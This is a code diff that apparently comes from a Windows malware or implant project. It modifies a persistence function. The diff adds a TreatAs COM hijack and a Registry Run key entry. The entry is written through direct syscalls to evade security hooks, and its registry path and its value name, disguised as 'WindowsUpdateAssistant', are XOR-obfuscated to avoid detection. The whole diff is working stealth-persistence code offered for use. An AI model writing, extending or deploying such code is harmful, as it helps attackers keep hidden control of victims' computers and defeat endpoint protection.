@@ -2,6 +2,7 @@
 #include "ComHijacker.h"
 #include "../utils/Logger.h"
 #include "../utils/Shared.h"
+#include "../utils/Obfuscator.h"
 #include "../evasion/Syscalls.h"
 #include "../evasion/NtStructs.h"
 #include <windows.h>
@@ -134,17 +135,82 @@ bool establishPersistence() {
         CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE);
     }
 
-    // Stealthy COM Hijack: Folder Background menu
-    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
+    // Stealthy COM Hijack via TreatAs redirection
+    // Victim: {3AD05575-8854-4856-A25F-3627763307B2}
+    std::wstring clsid = L"{3AD05575-8854-4856-A25F-3627763307B2}";
 
-    LOG_INFO("Attempting COM Hijack for " + utils::ws2s(clsid));
-    if (ComHijacker::Install(persistPath, clsid)) {
+    LOG_INFO("Attempting TreatAs COM Hijack for " + utils::ws2s(clsid));
+    bool comSuccess = ComHijacker::Install(persistPath, clsid);
+    if (comSuccess) {
         LOG_INFO("COM Hijack installed successfully.");
-        return true;
+    } else {
+        LOG_ERR("COM Hijack installation failed.");
     }
 
-    LOG_ERR("COM Hijack installation failed.");
-    return false;
+    // --- Registry Run Key Persistence (for auto-start on reboot) ---
+    LOG_INFO("Attempting Registry Run key persistence...");
+
+    std::wstring sid = utils::GetCurrentUserSid();
+    if (sid.empty()) {
+        LOG_ERR("Failed to get current user SID for Run key");
+        return comSuccess;
+    }
+
+    auto& resolver = evasion::SyscallResolver::GetInstance();
+    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
+    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
+    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
+
+    if (ntOpenKeySsn != 0xFFFFFFFF && ntSetValueKeySsn != 0xFFFFFFFF && ntCloseSsn != 0xFFFFFFFF) {
+        std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
+        UNICODE_STRING uHkcu;
+        uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
+        uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
+        uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);
+
+        OBJECT_ATTRIBUTES objAttr;
+        InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        HANDLE hHkcu = NULL;
+        NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+
+        if (NT_SUCCESS(status)) {
+            // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            std::wstring runKeyPath = utils::xor_wstr(L"\x09\x35\x3c\x2e\x2d\x3b\x28\x3f\x00\x17\x33\x39\x28\x35\x29\x35\x3c\x2e\x00\x0d\x33\x34\x3e\x35\x2d\x29\x00\x19\x2f\x28\x28\x3f\x34\x2e\x1c\x3f\x28\x29\x33\x35\x34\x00\x08\x2f\x34", 43);
+            HANDLE hRunKey = NULL;
+            status = utils::Shared::NtCreateKeyRelative(hHkcu, runKeyPath, &hRunKey);
+
+            InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+
+            if (NT_SUCCESS(status)) {
+                // "WindowsUpdateAssistant"
+                std::wstring valName = utils::xor_wstr(L"\x0d\x33\x34\x3e\x35\x2d\x29\x0f\x2a\x3e\x3b\x2e\x3f\x1b\x29\x29\x33\x29\x2e\x3b\x34\x2e", 22);
+                UNICODE_STRING uValName;
+                uValName.Buffer = (PWSTR)valName.c_str();
+                uValName.Length = (USHORT)(valName.length() * sizeof(wchar_t));
+                uValName.MaximumLength = uValName.Length + sizeof(wchar_t);
+
+                status = InternalDoSyscall(ntSetValueKeySsn, hRunKey, &uValName, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)persistPath.c_str(), (PVOID)(UINT_PTR)((persistPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
+
+                InternalDoSyscall(ntCloseSsn, hRunKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+
+                if (NT_SUCCESS(status)) {
+                    LOG_INFO("Registry Run key installed successfully.");
+                    return true;
+                } else {
+                    LOG_ERR("NtSetValueKey for Run key failed: 0x" + utils::Shared::ToHex((unsigned int)status));
+                }
+            } else {
+                LOG_ERR("NtCreateKeyRelative for Run path failed: 0x" + utils::Shared::ToHex((unsigned int)status));
+            }
+        } else {
+            LOG_ERR("Failed to open HKCU root for Run key: 0x" + utils::Shared::ToHex((unsigned int)status));
+        }
+    } else {
+        LOG_ERR("Syscall resolution failed for Run key persistence.");
+    }
+
+    return comSuccess;
 }
 
 } // namespace persistence
